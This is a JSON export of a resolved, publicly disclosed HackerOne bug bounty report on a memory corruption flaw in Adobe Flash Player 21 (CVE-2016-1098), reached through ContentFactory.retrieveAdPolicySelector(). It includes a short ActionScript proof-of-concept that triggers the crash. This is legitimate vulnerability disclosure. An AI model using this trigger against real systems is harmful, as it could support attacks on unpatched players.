{"id":138516,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzg1MTY=","url":"https://hackerone.com/reports/138516","title":"Adobe Flash Player ContentFactory class Memory Corruption Vulnerability","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-13T01:10:41.223Z","submitted_at":"2016-05-13T01:10:41.223Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hhj4ck","url":"/hhj4ck","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46,"url":"https://hackerone.com/ibb-flash","handle":"ibb-flash","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/046/1483b151cc84e0ff54b32196809ca3bf945812f2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/046/1483b151cc84e0ff54b32196809ca3bf945812f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Flash (IBB)","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:42:44.307Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:42:42.514Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I. Summary\nAdobe Flash Player is prone to a vulnerability which leads to memory corruption because of improper validation of ContentFactory.retrieveAdPolicySelector().\n------------------------------------------------------------------\nII. Description\nAdobe Flash is a multimedia and software platform used for authoring of vector graphics, animation, games and rich Internet applications (RIAs) that can be viewed, played and executed in Adobe Flash Player. \n\nNormally, retrieveAdPolicySelector() should validates its parameter and returns error in AS3 level if anything goes wrong.\nIf retrieveAdPolicySelector() function is invoked directly with invalid parameter, some inner class instance will be absent, which will cause a memory crash.\n\nPOC Source Code:\n\npackage\n{\n\timport com.adobe.tvsdk.mediacore.ContentFactory;\n\timport com.adobe.tvsdk.mediacore.MediaPlayerItem;\n\timport com.adobe.tvsdk.mediacore.PSDK;\t\n\timport flash.display.Sprite;\n\t\n\tpublic class poc extends Sprite\n\t{\n\t\tpublic function poc()\n\t\t{\n\t\t\tvar ps:PSDK = PSDK.pSDK;\n\t\t\tvar mt:MediaPlayerItem;\n\t\t\tvar obj:ContentFactory = ps.createDefaultContentFactory();\n\t\t\tobj.retrieveAdPolicySelector(mt);\n\t\t}\n\t}\n}\n------------------------------------------------------------------\nIII. Impact\nMemory Corruption\n------------------------------------------------------------------\nIV. Affected\nAdobe Flash Player 21.\n------------------------------------------------------------------\nV. Credit\nWen Guanxing from Pangu LAB is credited for this vulnerability.\n\nIt has been assigned as CVE-2016-1098 by Adobe:\nhttps://helpx.adobe.com/security/products/flash-player/apsb16-15.html","vulnerability_information_html":"\u003cp\u003eI. Summary\u003c/p\u003e\n\n\u003ch2 id=\"adobe-flash-player-is-prone-to-a-vulnerability-which-leads-to-memory-corruption-because-of-improper-validation-of-contentfactory-retrieveadpolicyselector\"\u003eAdobe Flash Player is prone to a vulnerability which leads to memory corruption because of improper validation of ContentFactory.retrieveAdPolicySelector().\u003c/h2\u003e\n\n\u003cp\u003eII. Description\u003cbr\u003e\nAdobe Flash is a multimedia and software platform used for authoring of vector graphics, animation, games and rich Internet applications (RIAs) that can be viewed, played and executed in Adobe Flash Player. \u003c/p\u003e\n\n\u003cp\u003eNormally, retrieveAdPolicySelector() should validates its parameter and returns error in AS3 level if anything goes wrong.\u003cbr\u003e\nIf retrieveAdPolicySelector() function is invoked directly with invalid parameter, some inner class instance will be absent, which will cause a memory crash.\u003c/p\u003e\n\n\u003cp\u003ePOC Source Code:\u003c/p\u003e\n\n\u003cp\u003epackage\u003cbr\u003e\n{\u003cbr\u003e\n    import com.adobe.tvsdk.mediacore.ContentFactory;\u003cbr\u003e\n    import com.adobe.tvsdk.mediacore.MediaPlayerItem;\u003cbr\u003e\n    import com.adobe.tvsdk.mediacore.PSDK;\u003cbr\u003e\u003cbr\u003e\n    import flash.display.Sprite;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003epublic class poc extends Sprite\n{\n    public function poc()\n    {\n        var ps:PSDK = PSDK.pSDK;\n        var mt:MediaPlayerItem;\n        var obj:ContentFactory = ps.createDefaultContentFactory();\n        obj.retrieveAdPolicySelector(mt);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"part-2b622\"\u003e}\u003c/h2\u003e\n\n\u003cp\u003eIII. Impact\u003c/p\u003e\n\n\u003ch2 id=\"memory-corruption\"\u003eMemory Corruption\u003c/h2\u003e\n\n\u003cp\u003eIV. Affected\u003c/p\u003e\n\n\u003ch2 id=\"adobe-flash-player-21\"\u003eAdobe Flash Player 21.\u003c/h2\u003e\n\n\u003cp\u003eV. Credit\u003cbr\u003e\nWen Guanxing from Pangu LAB is credited for this vulnerability.\u003c/p\u003e\n\n\u003cp\u003eIt has been assigned as CVE-2016-1098 by Adobe:\u003cbr\u003e\n\u003ca title=\"https://helpx.adobe.com/security/products/flash-player/apsb16-15.html\" href=\"/redirect?url=https%3A%2F%2Fhelpx.adobe.com%2Fsecurity%2Fproducts%2Fflash-player%2Fapsb16-15.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://helpx.adobe.com/security/products/flash-player/apsb16-15.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":93507,"file_name":"poc.swf","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/093/507/fc38609d5e471992df7ee33d4e75f0260b58fa14/poc.swf?response-content-disposition=attachment%3B%20filename%3D%22poc.swf%22%3B%20filename%2A%3DUTF-8%27%27poc.swf\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042718Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=3a464159750bc936e3c7122adc06496164904fd93ca2d74a7314b043965bf5af","file_size":854,"type":"application/x-shockwave-flash"}],"allow_singular_disclosure_at":"2019-11-12T09:42:42.582Z","allow_singular_disclosure_after":-35664275.91799952,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1146867,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-23T04:47:07.684Z","updated_at":"2016-08-23T04:47:07.684Z","actor":{"url":"/ibb-flash","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/046/1483b151cc84e0ff54b32196809ca3bf945812f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Flash (IBB)"}},"bounty_amount":"2000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-flash","collaborator":{"username":"hhj4ck","url":"/hhj4ck"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1146868,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-23T04:47:15.838Z","updated_at":"2016-08-23T04:47:15.838Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"hhj4ck","url":"/hhj4ck"},"genius_execution_id":null,"team_handle":"ibb-flash","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026612,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:42:42.529Z","updated_at":"2019-10-13T09:42:42.529Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-flash","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285906,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:42:44.337Z","updated_at":"2019-11-12T09:42:44.337Z","actor":{"url":"/ibb-flash","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/046/1483b151cc84e0ff54b32196809ca3bf945812f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Flash (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-flash","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}